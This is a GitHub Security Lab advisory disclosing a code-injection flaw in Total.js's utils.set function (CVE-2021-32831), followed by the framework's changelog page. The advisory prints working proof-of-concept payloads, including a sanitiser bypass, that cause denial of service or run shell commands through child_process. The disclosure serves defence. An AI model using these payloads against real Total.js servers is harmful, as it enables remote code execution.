=== Content from securitylab.github.com_87ca1fcb_20250114_205930.html ===

[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

July 21, 2021
# GHSL-2021-066: DoS and RCE in totaljs

[![Author avatar](https://avatars.githubusercontent.com/u/61799930)
GitHub Security Lab](https://github.com/ghsecuritylab)

## Coordinated Disclosure Timeline

* 2021-04-08: Report sent to maintainers
* 2021-06-04: Requested maintainers acknowledgment of the report
* 2021-07-01: Re-requested maintainers acknowledgment of the report
* 2021-07-07: Deadline expired without maintainers acknowledgment
* 2021-07-21: Publication as per our disclosure policy

## Product

Total.js

## Tested Version

Latest version available on npm `3.4.8`.

## Details

Calling the `utils.set` function with user-controlled values leads to code-injection.

#### Impact

An attacker can execute abitrary javascript code in the context of node.

#### Resources

*Proof of concept: Denial of service*

The PoC causes a DoS by going into an infinite loop.

```
var utils = require('total.js/utils');
utils.set({},'a;Function(`while(1)1;`)();//');

// Alternatively if "Function" is sanitized (similar to how "eval is currently sanitized), then the below will still work:
utils.set({},'f[`__` + `proto__`][`cons` + `tructor`][`cons` + `tructor`](`while(1)1;`)();//')

```

*Proof of concept: Code execution*

This PoC creates a file `GHSL` inside the current working directory.

```
var utils = require('total.js/utils');
utils.set({},'a;Function(`require("child_process")\\x2eexecSync("touch GHSL")`)();//')

```
## CVE

* CVE-2021-32831

## Resources

* [Commit](https://github.com/totaljs/framework/commit/887b0fa9e162ef7a2dd9cec20a5ca122726373b3)

## Credit

This issue was discovered by [@erik-krogh (Erik Krogh Kristensen)](https://github.com/erik-krogh).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include `GHSL-2021-066` in any communication regarding this issue.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information



=== Content from github.com_40edeeda_20250114_205926.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftotaljs%2Fframework%2Fblob%2Fe644167d5378afdc45cb0156190349b2c07ef235%2Fchanges.txt)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftotaljs%2Fframework%2Fblob%2Fe644167d5378afdc45cb0156190349b2c07ef235%2Fchanges.txt)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=totaljs%2Fframework)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[totaljs](/totaljs)
/
**[framework](/totaljs/framework)**
Public

* [Notifications](/login?return_to=%2Ftotaljs%2Fframework) You must be signed in to change notification settings
* [Fork
  449](/login?return_to=%2Ftotaljs%2Fframework)
* [Star
   4.4k](/login?return_to=%2Ftotaljs%2Fframework)

* [Code](/totaljs/framework)
* [Issues
  2](/totaljs/framework/issues)
* [Pull requests
  0](/totaljs/framework/pulls)
* [Discussions](/totaljs/framework/discussions)
* [Actions](/totaljs/framework/actions)
* [Projects
  0](/totaljs/framework/projects)
* [Security](/totaljs/framework/security)
* [Insights](/totaljs/framework/pulse)

Additional navigation options

* [Code](/totaljs/framework)
* [Issues](/totaljs/framework/issues)
* [Pull requests](/totaljs/framework/pulls)
* [Discussions](/totaljs/framework/discussions)
* [Actions](/totaljs/framework/actions)
* [Projects](/totaljs/framework/projects)
* [Security](/totaljs/framework/security)
* [Insights](/totaljs/framework/pulse)

## Files

 e644167
## Breadcrumbs

1. [framework](/totaljs/framework/tree/e644167d5378afdc45cb0156190349b2c07ef235)
/
# changes.txt

Copy path Blame  Blame
## Latest commit

## History

[History](/totaljs/framework/commits/e644167d5378afdc45cb0156190349b2c07ef235/changes.txt)executable file·2628 lines (2342 loc) · 143 KB e644167
## Breadcrumbs

1. [framework](/totaljs/framework/tree/e644167d5378afdc45cb0156190349b2c07ef235)
/
# changes.txt

Top
## File metadata and controls

* Code
* Blame

executable file·2628 lines (2342 loc) · 143 KB[Raw](https://github.com/totaljs/framework/raw/e644167d5378afdc45cb0156190349b2c07ef235/changes.txt)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000======= 3.4.10
- fixed CSS variables
======= 3.4.9
- added HTML escaping for meta tags- added `insecure` flag into the `U.request()` method- added `RESTBuilder.insecure()` method- fixed security issue when parsing query arguments (reported by <https://github.com/fl4x>)- fixed security in `U.get()` and `U.set()` (reported by Agustin Gianni)
======= 3.4.8
- fixed measuring dimension for `.gif` images- fixed potential remote code execution in `U.set()` founded by [Snyk](https://snyk.io/vuln)
======= 3.4.7
- fixed: command injection in `Image.pipe()` and `Image.stream()`- fixed `DELETE` method for the schemas (now it works like `PATCH` method)- fixed: `controller.transfer()`
======= 3.4.6
- added: a support for Total.js v4 UIDs
- updated: file stats- updated: calculating of `usage`
- fixed: applying of `default\_root` in static files- fixed: routing evaluation- fixed: parsing of longer WebSocket messages- fixed: mail error handling- fixed: `versions` with `default\_root`
======= 3.4.5
- fixed: a problem with persistent images
======= 3.4.4
- added: schema options `$.successful(function(response) {})`- added: `options.reconnectserver {Boolean}` to `WEBSOCKETCLIENT`- added: `req.snapshot(callback(err, request\_body))`- added: a new command `CMD('reload\_preferences')`- added: a new FILESTORAGE mechanism based on `UID`- added: `sql` extension to `U.getContentType()`- added: `F.stats.performance.usage` which contains percentual usage of the thread
- updated: `SchemaOptions` method `$.response([index/operation\_name])`, e.g. `$.response('workflow.NAME')`- updated: snapshot `startscript.js.json` contains tabs instead of spaces- updated: `DatabaseBuilder.rule(rule, [param])`, supports string declaration of filter function- updated: `URL` validation
- fixed: cleaning of NoSQL embedded databases- fixed: `String.parseCSV()`, now supports multiline strings- fixed: a bug when closing of websocket- fixed: `DatabaseBuilder.search()` method- fixed: `Error` in `CLONE()` method- fixed: `schema.inherit()` by adding `schema.middleware()` and `schema.verify()`- fixed: parsing messages in WebSocket- fixed: a problem in some commands pre-render in the view compiler- fixed: parsing of query strings
======= 3.4.3
- added: `HASH(value, [type])` for creating hash like in jComponent- added: `SchemaOptions.repo` as alias to `SchemaInstance.model.$$repository`- added: a new type `CONVERT syntax` to `schema.define()` (more in docs)- added: `SchemaEntity.verify(name, function($), [cache])` for async verification of values- added: `TEMP` variable as a new global variable (it's cleaned every 7 minutes)- added: `CONF.allow\_persistent\_images: true` which allows to reuse resized images in temp directory- added: `req.filecache(callback)` as alias for `F.exists()`- added: own QueryParser- added: `RESTBuilderInstance.convert('name:String,age:Number')` method- added: `RESTBuilder.upgrade(fn(restbuilder))` for upgrading of `RESTBuilder`- added: `RESTBuilder` parses Total.js Errors in responses as Error- added: `String.prototype.env()` replaces all values in the form `[key]` for `CONF.key`- added: WebSocket supports a new type - raw `buffer`- added: `Number.fixed(decimals)`
- updated: `websocket.send2(message, comparer, replacer, [params])` by adding `params` argument for comparer function- updated: `Websocket.encodedecode` can enable/disable easily encoding of messages- updated: bundling skips all bundles with `-bk.bundle` in filename- updated: bundle filenames are displayed in console- updated: `UPDATE()` method by adding `noarchive` argument- updated: `TEST()` method supports `[subdomain]` keyword and `METHOD url` in URL address- updated: `MODIFY([filename], fn)` by adding `filename` argument- updated: background of schedulers by @fgnm- updated: `U.download()` by adding `param` argument- updated: `U.request()` by adding `param` argument- updated: `schema.cl(name, [value])` method by adding `value` argument for replacing of existing code-list- updated: Tangular version to `v4.0.0`
- improved: `filename` in modificators (now filenames contain relative paths)- improved: performance of `U.request()` (around +10%)- improved: performance of `U.download()` (around +10%)- improved: performance of `RESTBuilder`- improved: CSS minifier by compressing single hex color from e.g. `#000000` to `#000`
- fixed: localization in `totaljs` executable script- fixed: phone validation- fixed: `DOWNLOAD()`- fixed: `Number.VAT()` by Tomas Novak- fixed: debugging mode in Node.js v14- fixed: `allow\_compile\_html` in static files- fixed: `ROUTE()` method, there was a problem with spaces `GET /\* `- fixed: `ACTION()` with json output- fixed: controller in `$ACTION()` with used `get` and `query` actions- fixed: `PATCH` method in `$ACTION()`- fixed: `schema.allow()` in `PATCH` method- fixed: image resizing in debug-mode
======= 3.4.1
- added: `SchemaOptions.parent` returns a parent model- added: Tangular template engine (experimental)- added: `String.makeid()` for creating of unique identifier from string- added: a new property called `message.ua` to `FLOWSTREAM()`
- updated: `HttpFile.fs()` by adding `id` argument for updating of existing file- updated: default value for `allow\_ssc\_validation` to `true`
- fixed: `String.parseDate(format)` with defined format- fixed: inheriting of controllers between schemas- fixed: `MailMessage.attachments()`- fixed: calling of `F.snapshotstats` in cache recycle- fixed: `controller.success()`- fixed: removing of unused files when a bundle is extracting- fixed: a processor function in `F.backup()`
- improved: `Date.format()`- improved: Total.js translate (supports ErrorBuilder and DBMS)
======= 3.4.0
- added: `date.setTimeZone(timezone)`- added: `NOSQL('~absolute\_path.nosql')' loads external NoSQL embedded database- added: `TABLE('~absolute\_path.nosql')' loads external Table- added: `(generate)` subtype into the `config` files- added: `String.isBase64()`- added: new schema type `Base64`- added: SchemaEntity supports `schema.addWorkflowExtension(name, fn($, [data]))`- added: SchemaEntity supports `schema.addTransformExtension(name, fn($, [data]))`- added: SchemaEntity supports `schema.addOperationExtension(name, fn($, [data]))`- added: SchemaEntity supports `schema.addHookExtension(name, fn($, [data]))`- added: SchemaEntity supports `schema.setSaveExtension(fn($, [data]))`- added: SchemaEntity supports `schema.setReadExtension(fn($, [data]))`- added: SchemaEntity supports `schema.setQueryExtension(fn($, [data]))`- added: SchemaEntity supports `schema.setRemoveExtension(fn($, [data]))`- added: SchemaEntity supports `schema.setInsertExtension(fn($, [data]))`- added: SchemaEntity supports `schema.setUpdateExtension(fn($, [data]))`- added: SchemaEntity supports `schema.setPatchExtension(fn($, [data]))`- added: SchemaOptions supports `$.extend([data])` for evaluating of all extensions for the current operation- added: `WebSocket.keys` property (it contains all keys with connections)- added: `threads` directory for server-less functionality- added: a global variable called `THREAD` with a name of current thread- added: `require('total.js').http(..., { thread: 'thread\_name' })` evaluates only specified thread- added: `require('total.js').cluster.http(..., { thread: 'thread\_name' })` evaluates only specified thread in cluster- added: framework creates a file with app stats in the form `your\_init\_script\_name.js.json`- added: a new config key `allow\_stats\_snapshot`- added: view engine `@{import()}` supports auto-merging JS or CSS files: `@{import('default.js + ui.js')}`- added: `exports.options` delegate to component in `FLOWSTREAM`- added: `DatabaseBuilder.autofill()` from DBMS- added: `HttpFile.extension` property- added: `HttpFile.size` property alias to `HttpFile.length`- added: auto-session cleaner of unused sessions- added: `allow\_sessions\_unused` config key for cleaning of unused sessions- added: missing `PATH.schemas`, `PATH.operations` and `PATH.tasks`- added: a new method `PATH.updates`- added: easy updating of applications via `UPDATE(versions, [callback], [pause\_server\_message])`- added: NOSQL counter `.reset([type], [id], [date], [callback])` method-- added: `session.listlive(callback)` returns all live items in session- added: `controller.ua` returns parsed User-Agent- added: `$.ua` returns parsed User-Agent in Schemas, Operations, TaskBuilder, `MIDDLEWARE()` and `AUTH()`- added: support for `.mjs` extensions- added: a simple support for DDOS protection `allow\_reqlimit : Number` (max. concurent requests by IP just-in-time)- added: unit-testing supports colors, added by @dacrhu- added: `String.encryptUID()` as alias for `U.encryptUID()`- added: `String.decryptUID()` as alias for `U.decryptUID()`
- updated: `WEBSOCKET()` supports `+`, `-` and `🔒` as authorization flags- updated: `LOAD()` supports `service` type- updated: cluster watches `restart` or `restart\_NAME\_of\_THREAD` files for restarting of existing threads- updated: cluster supports `auto` mode- updated: cluster supports watcher in `debug` mode- updated: `\*.filefs()`, `\*.filenosql()`, `\*.imagefs()`, `\*.imagenosql()` by adding `checkmeta` argument- updated: `$.done([user\_instance])` method in `AUTH()`, added a new argument called `user\_instance` (optional)- updated: GZIP is enabled only for JSON bodies which have more than 4096 bytes- updated: `.env` parser supports parsing of `.env-debug` or `.env-release` files according to the mode- updated: list of user-agents in `String.parseUA()`
- fixed: `ON('error404')` when the route doens't exist- fixed: `filter` in Schema `workflows`, `transformations` and `operations`- fixed: `NOSQL()` joins with absolute paths- fixed: `TABLE()` joins with absolute paths- fixed: `(random)` subtype in `config` files- fixed: `(response)` phrase in `ROUTE()` for multiple `OPERATIONS`- fixed: a response in `ROUTE()` with mulitple operations if the result contained some error- fixed: a security bug with a path traversal vulnerability- fixed: `debug` watcher for `themes`- fixed: `generators` in schemas with a new declaration- fixed: a problem with handling files in 404 action- fixed: `startup` directory in bundles- fixed: `schema.inherit()` didn't copy `required` fields.- fixed: `SUCCESS()` serialization with `SUCCESS()` argument- fixed: a critial bug with `UID()` generator- fixed: clearing of DNS cache
- improved: `LOGMAIL()` mail format- improved: starting logs in console output (added IPv4 local address)- improved: performance with JSON serialization in `controller.success()` and `controller.done()`
======= 3.3.2
- fixed: default time zone (`utc` is default time zone)
======= 3.3.1
- added: `RESTBuilder.callback()` which performs `.exec()` automatically- added: `FLOWSTREAM()`
- fixed: `AUDIT()` method- fixed: error handling in `controller.invalid()`- fixed: `req.authorize()`- fixed: CSS auto-vendor-prefixes, fixed `opacity` with `!important`- fixed: `CONVERT()` a problem with arrays
======= 3.3.0
- added: `NEWTASK(name, declaration)` for creating preddefined `TaskBuilder`- added: `TASK(name, taskname, callback, [controller/SchemaOptions/OperationOptions/ErrorBuilder])` for executing preddefined `TaskBuilder`- added: a new config key `directory\_tasks` for `TaskBuilder`- added: a global alias `MODIFY()` for `F.modify()`- added: a global alias `VIEWCOMPILE()` for `F.view\_compile()`- added: `mail.type = 'html'` can be `html` (default) or `plain`- added: `$.headers` into the `SchemaOptions`, `OperationOptions` and `TaskBuilder`- added: `String.parseCSV([delimiter])` returns `Object Array`- added: `String.parseUA([structured])` a simple user-agent parser- added: `req.useragent([structured])` returns parsed User-Agent- added: a new config key `default\_crypto` it can rewrite Total.js crypto mechanism (default: `undefined`)- added: a new config key `default\_crypto\_iv` it's an initialization vector (default: generated from `secret`) or it can contain a custom `hex` value- added: a new config key `allow\_workers\_silent` can enable/disable silent workers (default: `false`)- added: a new config sub-type called `random`, example: `secret\_key (random) : 10` and `10` means a length of value- added: a new command `clear\_dnscache` for clearing DNS cache- added: commands `INSTALL('command', 'command\_name', function)` for registering commands and `CMD(name, [a], [b], [c], [d])` for executing commands- added: `ENCRYPTREQ(req, val, [key], [strict])` to encrypt value according to the request meta data- added: `DECRYPTREQ(req, val, [key])` to decrypt value according to the request meta data- added: `controller.nocache()`- added: `controller.nocontent()`- added: `REPO` as a global variable- added: `FUNC` as a global variable- added: `MAIN` as a global variable- added: `DEF` as a global variable for defining of behaviour for some operations (alternative to `F`)- added: `PREF.set(name, [value])` (read+write) or `PREF.propname` (only read) for reading/writing a persistent preferences- added: `F.onPrefSave = function(obj)` to write preferences- added: `F.onPrefLoad = function(next(obj))` to read preferences- added: `RESTBuilder.url(url)` which returns a new instance of `RESTBuilder` for chaining- added: `restbuilder.keepalive()` enables a keepalive for `RESTBuilder` instance- added: `SESSION()` management, more in docs- added: `controller.sessionid` with ID of `SESSION()`- added: `AUTH()` supports a new auth declaration with `$` as `AuthOptions` like `SchemaOptions` or `OperationOptions`- added: `AuthOptions` to prototypes- added: `ErrorBuilder.length` property (alias for `instance.items.length)- added: Schemas `prepare` supports `req` argument- added: `DEF.currencies.eur = function(val) {}` registers a currency formatter- added: `DEF.helpers` registers a new view engine helper (`F.helpers` is alias for for this object)- added: `DEF.validators` is alias for for `F.validators`- added: usage of currency formatter `Number.currency(currency)`- added: new schema type `Number2` with default value is `null`, not zero `0`- added: `@{json2(model, elementID, key1, key2, key3)}` can serialize data with keys defined into the `<script type="application/json">`- added: schemas supports `PATCH` and `.setPatch()`, only specified field are processed- added: `SchemaOptions` supports `$.keys` for `PATCH` method- added: `schema.cl(name)` ("cl" means codelist) returns `{Array}` a list of values from defined enum/keyvalue- added: `schema.props()` returns `{Object}` meta info about all defined properties- added: `SchemaOptions`, `OperationOptions` and `TaskOptions` supports `$.req` and `$.res` properties- added: `AUDIT(name, $, [type], message)` a method for audit logs- added: \_\_obsolete\_\_ message to older declaration of middleware, schemas and operations- added: `U.diffarr(prop, arr\_A, arr\_B)` for comparing of two arrays- added: `DIFFARR(prop, arr\_A, arr\_B)` is a global alias for `U.diffarr()`- added: `global.REQUIRE()` for local modules within app directory- added: `global.isWORKER` variable which contains `true` (when the process is executed as a worker) or `false`- added: `ACTION(url, [data], callback)` can evaluate a route without request creation- added: `ROUTE('🔒 METHOD URL')`, it means that 🔒 adds `authorized` flag- added: `ROUTE('+METHOD URL')`, it means that `++` or `+` adds `authorized` flag- added: `ROUTE('-METHOD URL')`, it means that `--` or `-` adds `authorized` flag- added: `SchemaOptions`, `OperationOptions`, `TaskOptions` supports filtered query arguments via `$.filter`- added: `controller.done([value])`- added: `SITEMAP()` as alias to `F.sitemap()`- added: config key `allow\_localize` enables a localization for all `HTML` files- added: `controller.breadcrumb` returns all sitemap items- added: `PAUSESERVER(name, pause)` pauses web server (alias for `F.wait()`)- added: `PROXY(endpoint, hostname, [copypath], [before\_fn(uri,req,res)], [after\_fn(res)])` makes a direct proxy from webserver- added: `schema.middleware(function($, next))` for creating simple middlewares for Schema operations- added: `FILE404(fn(req, res))` performs a simple fallback for non-existing files- added: `$PATCH(schema, model, [options], callback, [controller])` method- added: `.env` parser to `process.env`- added: `String.parseENV()` for parsing `.env` syntax- added: `$.noop()` for custom responses- added: `$ACTION(schemaroute, [model], callback, [controller])` evaluates schema- added: `process.send('total:restart')` performs a restart of app when the app is in debug mode- added: `NOSQLREADER(filename)` for reading different files of NoSQL embedded databases- added: `TABLEREADER(filename)` for reading different files of Table embedded databases- added: `Mail.use()` an alias for `F.useSMTP()`- added: `F.onAudit(name, data)` delegate for handling audit logs- added: Components support a new features called `Parts`, more in docs
- updated: `$.invalid()` without arguments can return a function `function(err)`- updated: Mail `unsubscribe` appends new header which enables `unsubscribe` in e.g. iOS- updated: `MODIFY`, handler contains a new argument `controller`- updated: `headers` argument in `controller.proxy` supports `flags: []` for REQEUST method- updated: `.filefs()` and `.filenosql()` supports `download` with `true` or with `(name, type) => 'new\_name'` (`filename` will be read from NoSQL binary file)- updated: `$.done(arg)` argument `@arg` can be `boolean` (response will be as a value) or object/primitive value (`arg` will be as a value)- updated: `String.arg(obj, [encode], [def])` added `encode` (`true`, `json`, `html`) and `def` arguments- updated: `AUTH(req, res, flags, next)` and `next` function can handle `callback(err, user)`- updated: `REQUEST()` supports `keepalive` flag- updated: `bundles` mechanism supports merging files `--filename` between `bundles` files- updated: `String.hash(true)` returns unsigned int- updated: `CONF:default\_image\_converter` supports `magick` for new version of ImageMagick- updated: `CONF.default\_image\_consumption` can contain ZERO value which means disabled optimialization of CPU/memory consumption- updated: `CONF.default\_image\_consumption` has changed a default value to `0`- updated: `U.parseXML(str, [replace])` and `String.parseXML([replace])` contains a new argument called `replace`- updated: `LOAD()` added a callback function- updated: components support `encoding="utf8"` attribute for `<file` tag (default: `base64`)- updated: `EventEmitter2` supports a new argument `obj`, example: `U.EventEmitter2(obj)` or supports `.extend` method: `U.EventEmitter2.extend(proto)`- updated: `UID()` generates new types of `UID` with 100% backward compatibility- updated: `FILESTORAGE()` now it works in cluster mode
- fixed: schemas validation- fixed: error handling in dynamic schemas- fixed: CSS variables- fixed: CSS variables with additional `!important` clause- fixed: `controller.proxy()` with Gzip/Deflate compression- fixed: HTTP status code with `204` in `REQUEST()`- fixed: `cookies` in `WEBSOCKETCLIENT`- fixed: `REQUEST()` with `json` flag and with `null` and `''` value- fixed: rendering components in `layout`- fixed: resources, there was a bug with reading of value from `default.resource`- fixed: too many open files in `res.image()`- fixed: too many open files in `res.filefs()`- fixed: Schema `Boolean` parser- fixed: renamed `F.stats.request.path` to `F.stats.request.patch`- fixed: SMTP sender (a problem with auth mechanism with some mail servers)- fixed: filter in `F.backup()`- fixed: paths for stored directories in `F.backup()`- fixed: uploading files- fixed: `U.getExtension()` by @molda
- renamed: `\*.routeScript` to `\*.public\_js`- renamed: `\*.routeStyle` to `\*.public\_css`- renamed: `\*.routeFont` to `\*.public\_font`- renamed: `\*.routeVideo` to `\*.public\_video`- renamed: `\*.routeImage` to `\*.public\_image`- renamed: `\*.routeDownload` to `\*.public\_download`- renamed: `\*.routeStatic` to `\*.public`- renamed: `controller.viewCompile()` to `controller.view\_compile()`- renamed: event `cache-set` to `cache\_set`:- renamed: event `controller-render-meta` to `controller\_render\_meta`- renamed: event `request-end` to `request\_end`- renamed: event `websocket-begin` to `websocket\_begin`- renamed: event `websocket-end` to `websocket\_end`- renamed: event `request-begin` to `request\_begin`- renamed: event `upload-begin` to `upload\_begin`- renamed: event `upload-end` to `upload\_end`- renamed: event `cache-expire` to `cache\_expired`
- \_\_removed: backward compatibility\_\_ with older version of Node.js < 10- removed: `F.hash()`, alternative `String.prototype.hash()`- removed: `controller.hash()`, alternative `String.prototype.hash()`
- improved Schemas and error handling- improved `res.filefs()` method for nonexistent files
======= 3.2.0
- added: `WORKER()` alias to `F.worker()`- added: `WORKER2()` alias to `F.worker2()`- added: `F.cluster.https()`- added: `TaskBuilder.done2([send\_value])` returns `function` with wrapped `.done()`- added: `TaskBuilder.success2([send\_value])` returns `function` with wrapped `.success()`- added: `TaskBuilder.next2(name)` returns `function` with wrapped `.next()`- added: new `RESTBuilder` aliases `.DELETE()`, `.PUT()`, `.POST()`, `.PATCH() and `.GET()`- added: `schema.before(key, (value, model, index) => value)` is a simple and new alternative to `schema.setPrepare()`- added: `SchemaInstance.$parent` returns a parent schema (if the schema is nested schema)- added: `SchemaOptions.redirect(url)` can perform a redirect from the schema- added: `OperationOptions.redirect(url)` can perform a redirect from the operation- added: `.ics` extension as acceptable file for the web server
- updated: `F.worker2()` returns entire `stdout` buffer in the `callback(err, buffer)`- updated: `$options()` by adding `disabled` key- updated: `String.ROOT()` by adding a support for jComponent `AJAX()` calls- updated: `RESTBuilder.method(method, [data])` added `data` argument- updated: `String.parseDate([format])` added `format` argument- updated: SMTP settings contain `heloid` as `heloidentifier` (manually can be defined `HELO` or `EHLO` command)- updated: SMTP hostname is computed from email if SMTP is not specified
- fixed: critical bug with security + improved security- fixed: system routing- fixed: NoSQL sorting, solved a strange problem- fixed: `U.request()` with `GET` method by @khaledkhalil94 (it doesn't send JSON data if `data` is null/undefined)- fixed: `F.wait()` in WebSocket- fixed: `String.capitalize(true)`- fixed: `REQUEST()` uploading of additional multipart/form-data (removed encoding)- fixed: view engine conditions defined in `<script>`- fixed: auto-redirects in `U.download()`- fixed: image streams resizing- fixed: `@{'%config\_key'}` a problem with rendering a value with `'`
- removed: `X-Powered-By: Total.js`
======= 3.1.0
